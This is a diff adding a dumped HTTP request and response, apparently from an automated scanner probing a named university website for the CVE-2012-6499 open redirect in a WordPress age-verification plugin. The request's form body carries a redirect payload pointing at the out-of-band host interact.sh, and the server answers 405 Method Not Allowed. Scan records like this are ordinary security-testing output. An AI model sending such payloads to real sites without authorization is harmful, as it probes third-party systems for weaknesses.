@@ -1,0 +1,41 @@
+[CVE-2012-6499] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/age-verification/age-verification.php
+
+
+POST /wp-content/plugins/age-verification/age-verification.php HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 70
+Accept-Encoding: gzip
+
+redirect_to=http://www.interact.sh&age_day=1&age_month=1&age_year=1970
+[CVE-2012-6499] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-content/plugins/age-verification/age-verification.php
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 454
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Via: 1.1 b6d3c8159ae3de02f9219eb71093bbe2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: gEr5MBaft9MTwwSdh9rBc_9fWJ4W925af6IbGE5AjNcaVN7K_iwmmA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: 39HNFRX1TRM9QFKY</li>
+<li>HostId: oE9JDlS0iUiK3ypcXJnTkuxOUZkCP3T+t2UukiR3hM8WCPEOob9JFbs4VEG/wFRWwl9ApIRunJQcDLVWUJ0urwxqhVdhYZNX1cRY3iWOXtA=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
